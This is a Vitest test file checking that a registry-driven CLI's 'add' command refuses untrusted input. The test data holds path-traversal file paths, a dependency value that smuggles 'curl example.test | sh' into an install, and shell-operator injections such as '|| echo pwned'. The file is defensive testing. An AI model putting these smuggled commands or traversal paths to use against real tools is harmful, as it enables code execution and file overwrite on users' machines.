// @vitest-environment node
import { spawnSync } from "node:child_process";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

/**
 * `macalicious add` run as a consumer runs it, against registries that should not be trusted.
 * A registry is data fetched from somewhere (`--registry <dir or URL>`), so no path in it may
 * reach outside `--dir`.
 */
const cli = path.resolve(import.meta.dirname, "../bin/macalicious.mjs");

let sandbox: string;
let project: string;
let registry: string;

beforeEach(() => {
  sandbox = mkdtempSync(path.join(tmpdir(), "macalicious-cli-"));
  project = path.join(sandbox, "project");
  registry = path.join(sandbox, "registry");
  mkdirSync(project);
  mkdirSync(registry);
});

afterEach(() => {
  rmSync(sandbox, { recursive: true, force: true });
});

function item(name: string, files: unknown[], extra: Record<string, unknown> = {}) {
  writeFileSync(
    path.join(registry, `${name}.json`),
    JSON.stringify({ name, registryDependencies: [], dependencies: [], files, ...extra }),
  );
}

function add(...names: string[]) {
  return spawnSync(
    process.execPath,
    [cli, "add", ...names, "--registry", registry, "--dir", "src/mac"],
    { cwd: project, encoding: "utf8" },
  );
}

const good = { path: "components/good/good.tsx", content: "export const good = 1;\n" };

describe("macalicious add", () => {
  it("writes a well-formed item inside --dir", () => {
    item("good", [good, { path: "lib/cn.ts", content: "export {};\n" }]);
    const run = add("good");
    expect(run.status).toBe(0);
    expect(readFileSync(path.join(project, "src/mac/components/good/good.tsx"), "utf8")).toBe(
      good.content,
    );
    expect(existsSync(path.join(project, "src/mac/lib/cn.ts"))).toBe(true);
  });

  it("reports what --dry-run would write without claiming it was written", () => {
    item("good", [good]);
    const dry = add("good", "--dry-run");
    expect(dry.status).toBe(0);
    expect(dry.stdout).toContain("would write");
    expect(dry.stdout).toContain("good: 1 to write, 0 unchanged, 0 skipped.");
    expect(dry.stdout).not.toContain("1 written");
    expect(existsSync(path.join(project, "src"))).toBe(false);

    const real = add("good");
    expect(real.stdout).toContain("good: 1 written, 0 unchanged, 0 skipped.");
  });

  it.each([
    ["a path that climbs out with ..", "../../../outside/escaped.txt"],
    ["a path with .. in the middle", "components/../../../outside/escaped.txt"],
    ["a path outside components/, lib/ and styles/", "elsewhere/escaped.txt"],
    ["a bare file name", "escaped.txt"],
    ["a path with a backslash", "components\\..\\..\\escaped.txt"],
    ["a hidden file", "components/.env"],
  ])("refuses %s and writes nothing", (_, evil) => {
    item("evil", [good, { path: evil, content: "pwned" }]);
    const run = add("evil");
    expect(run.status).toBe(1);
    expect(run.stderr).toContain("Refusing registry item");
    // Not even the valid file that came first: the whole item is checked before any write.
    expect(existsSync(path.join(project, "src"))).toBe(false);
    expect(existsSync(path.join(sandbox, "outside"))).toBe(false);
    expect(existsSync(path.join(project, "escaped.txt"))).toBe(false);
  });

  it("refuses an absolute path and writes nothing", () => {
    const target = path.join(sandbox, "absolute.txt");
    item("evil", [good, { path: target, content: "pwned" }]);
    const run = add("evil");
    expect(run.status).toBe(1);
    expect(existsSync(target)).toBe(false);
    expect(existsSync(path.join(project, "src"))).toBe(false);
  });

  // Creating a symbolic link needs a privilege on Windows, and the printed command is for a
  // POSIX shell; both tests run everywhere else.
  const posix = process.platform !== "win32";

  it.runIf(posix)("refuses to write through a symbolic link that leaves --dir", () => {
    const outside = path.join(sandbox, "outside");
    mkdirSync(outside);
    mkdirSync(path.join(project, "src/mac"), { recursive: true });
    symlinkSync(outside, path.join(project, "src/mac/components"), "dir");
    item("good", [good]);
    const run = add("good");
    expect(run.status).toBe(1);
    expect(run.stderr).toContain("symbolic link");
    expect(existsSync(path.join(outside, "good"))).toBe(false);
  });

  it("refuses an item name that is a path", () => {
    writeFileSync(path.join(sandbox, "secret.json"), JSON.stringify({ files: [] }));
    const run = add("../secret");
    expect(run.status).toBe(1);
    expect(run.stderr).toContain("is not a component name");
  });

  it("refuses a dependency that is not a package name, before writing", () => {
    item("evil", [good], { dependencies: ["react; curl example.test | sh"] });
    const run = add("evil");
    expect(run.status).toBe(1);
    expect(run.stderr).toContain("is not an npm package name");
    expect(existsSync(path.join(project, "src"))).toBe(false);
  });

  it.runIf(posix)("prints an install command a shell reads as package arguments only", () => {
    const dependencies = ["@base-ui/react@^1.8.0", "react@>=19 <20", "left-pad@1 || echo pwned"];
    item("good", [good], { dependencies });
    const run = add("good");
    expect(run.status).toBe(0);
    const command = /^ {2}(npm install .*)$/m.exec(run.stdout)?.[1];
    expect(command).toBeDefined();
    // Run the printed line with npm replaced by a function that lists what it was given.
    const shell = spawnSync("sh", ["-c", `npm() { printf '%s\\n' "$@"; }\n${command}`], {
      cwd: project,
      encoding: "utf8",
    });
    expect(shell.status).toBe(0);
    expect(shell.stdout.trim().split("\n")).toEqual(["install", ...[...dependencies].sort()]);
    // No redirection happened: "<20" did not read a file and ">=19" did not create one.
    expect(shell.stderr).toBe("");
    expect(existsSync(path.join(project, "=19"))).toBe(false);
  });

  it.each([
    ["an empty name", ""],
    ["a path", "../evil"],
  ])("refuses a registry dependency that is %s and copies nothing", (_, bad) => {
    // An empty name once ended the loop silently, dropping the dependencies after it.
    item("good", [good], { registryDependencies: [bad, "other"] });
    item("other", [{ path: "components/other/other.tsx", content: "export {};\n" }]);
    const run = add("good");
    expect(run.status).toBe(1);
    expect(run.stderr).toContain("is not a component name");
    expect(existsSync(path.join(project, "src"))).toBe(false);
  });

  it("refuses a registry dependency whose files escape", () => {
    item("good", [good], { registryDependencies: ["evil"] });
    item("evil", [{ path: "../escaped.txt", content: "pwned" }]);
    const run = add("good");
    expect(run.status).toBe(1);
    expect(existsSync(path.join(project, "src"))).toBe(false);
  });
});
